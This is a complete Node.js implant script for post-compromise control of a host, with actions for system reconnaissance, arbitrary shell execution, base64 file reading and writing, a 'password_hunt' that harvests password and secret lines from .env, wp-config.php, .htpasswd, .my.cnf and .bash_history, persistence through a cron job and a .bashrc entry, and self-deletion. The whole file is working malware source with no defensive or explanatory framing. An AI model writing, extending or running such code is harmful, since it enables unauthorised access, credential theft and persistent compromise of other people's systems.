#!/usr/bin/env node
const http = require('http');
const https = require('https');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const AUTH_KEY = "sentinelx_2024";
const C2_URL = "";

function json(r) { process.stdout.write(JSON.stringify(r) + "\n"); }

function beacon() {
    json({ status: "ok", data: {
        hostname: os.hostname(), os: os.type() + " " + os.release(),
        node: process.version, user: os.userInfo().username,
        cwd: process.cwd(), arch: os.arch(), platform: os.platform(),
        mem_free: os.freemem(), mem_total: os.totalmem(),
        uptime: os.uptime(), cpus: os.cpus().length,
    }});
}

function execCmd(cmd) {
    try {
        const out = execSync(cmd, { encoding: 'utf8', timeout: 30000, shell: true });
        json({ status: "ok", output: out, cwd: process.cwd() });
    } catch(e) {
        json({ status: "ok", output: e.stdout + e.stderr, cwd: process.cwd() });
    }
}

function fileList(dir) {
    try {
        const items = fs.readdirSync(dir).filter(e => e !== '.' && e !== '..').map(e => {
            const fp = path.join(dir, e);
            const s = fs.statSync(fp);
            return { name: e, type: s.isDirectory() ? 'dir' : 'file', size: s.size };
        });
        json({ status: "ok", items, path: fs.realpathSync(dir) });
    } catch(e) { json({ status: "error", message: e.message }); }
}

function fileRead(p) {
    try {
        const data = fs.readFileSync(p);
        json({ status: "ok", content: data.toString('base64') });
    } catch(e) { json({ status: "error", message: e.message }); }
}

function fileWrite(p, content) {
    try {
        fs.writeFileSync(p, Buffer.from(content, 'base64'));
        json({ status: "ok", message: "Written" });
    } catch(e) { json({ status: "error", message: e.message }); }
}

function fileSearch(root, pattern, maxR) {
    const results = [];
    const fnmatch = require('fnmatch') || ((name, pat) => name.includes(pat.replace(/\*/g, '')));
    try {
        function walk(dir) {
            const entries = fs.readdirSync(dir);
            for (const e of entries) {
                if (results.length >= (maxR || 100)) break;
                const fp = path.join(dir, e);
                try {
                    const s = fs.statSync(fp);
                    if (s.isDirectory()) walk(fp);
                    else if (e.includes(pattern.replace('*', ''))) results.push({ name: e, path: fp, size: s.size });
                } catch {}
            }
        }
        walk(root);
        json({ status: "ok", results, count: results.length });
    } catch(e) { json({ status: "error", message: e.message }); }
}

function passwordHunt() {
    const hits = [];
    const targets = ['.env', 'config.php', 'wp-config.php', '.htpasswd', '.my.cnf', '.bash_history'];
    const roots = [process.cwd(), '/var/www/html', '/etc', os.homedir()];
    for (const root of roots) {
        if (!fs.existsSync(root)) continue;
        for (const t of targets) {
            const fp = path.join(root, t);
            if (!fs.existsSync(fp)) continue;
            try {
                const content = fs.readFileSync(fp, 'utf8');
                content.split('\n').forEach((line, i) => {
                    if (/password|pass|secret|key|db_pass/i.test(line)) {
                        hits.push({ file: fp, line: i + 1, match: line.trim().substring(0, 200) });
                    }
                });
            } catch {}
        }
    }
    json({ status: "ok", hits, count: hits.length });
}

function persistence(method) {
    const results = [];
    const self = __filename;
    if (method === 'cron' || method === 'all') {
        try {
            const cron = `* * * * * node ${self} >/dev/null 2>&1\n`;
            execSync(`(crontab -l 2>/dev/null; echo "${cron}") | crontab -`);
            results.push({ method: 'cron', status: 'installed' });
        } catch(e) { results.push({ method: 'cron', status: 'error', detail: e.message }); }
    }
    if (method === 'bashrc' || method === 'all') {
        try {
            const rc = path.join(os.homedir(), '.bashrc');
            fs.appendFileSync(rc, `\nnode ${self} >/dev/null 2>&1 &\n`);
            results.push({ method: 'bashrc', status: 'installed' });
        } catch(e) { results.push({ method: 'bashrc', status: 'error', detail: e.message }); }
    }
    json({ status: "ok", results });
}

function selfDestruct() {
    try { fs.unlinkSync(__filename); } catch {}
    json({ status: "ok" });
}

const action = process.argv[2] || 'beacon';
const arg1 = process.argv[3] || '';
const arg2 = process.argv[4] || '';

switch(action) {
    case 'beacon': beacon(); break;
    case 'exec': execCmd(process.argv.slice(3).join(' ')); break;
    case 'file_list': fileList(arg1 || '.'); break;
    case 'file_read': fileRead(arg1); break;
    case 'file_write': fileWrite(arg1, arg2); break;
    case 'file_search': fileSearch(arg1 || '/', arg2 || '*'); break;
    case 'password_hunt': passwordHunt(); break;
    case 'persistence': persistence(arg1 || 'all'); break;
    case 'self_destruct': selfDestruct(); break;
    default: json({ status: "error", message: "Unknown action" });
}
